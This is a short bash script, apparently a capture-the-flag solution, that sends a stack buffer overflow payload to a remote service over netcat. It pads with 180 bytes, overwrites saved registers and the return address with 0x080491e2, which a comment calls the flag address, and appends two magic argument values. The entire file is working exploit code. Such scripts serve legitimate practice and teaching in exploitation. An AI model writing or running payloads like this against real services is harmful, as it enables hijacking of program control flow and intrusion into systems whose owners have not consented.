#!/bin/bash
# 0x080491e2 flag address
{
echo -ne $(python3 -c "print('A'*(180), end='')")   
echo -ne 'BBBB' # unknown
echo -ne 'CCCC' # EBP
echo -ne '\xe2\x91\x04\x08'  #EIP
echo -ne 'DDDD' # Dummy
echo -ne '\xef\xbe\xad\xde' # deadbeef
echo -ne '\x0d\xd0\xde\xc0' # c0ded00d
} | nc 188.166.171.200 31618
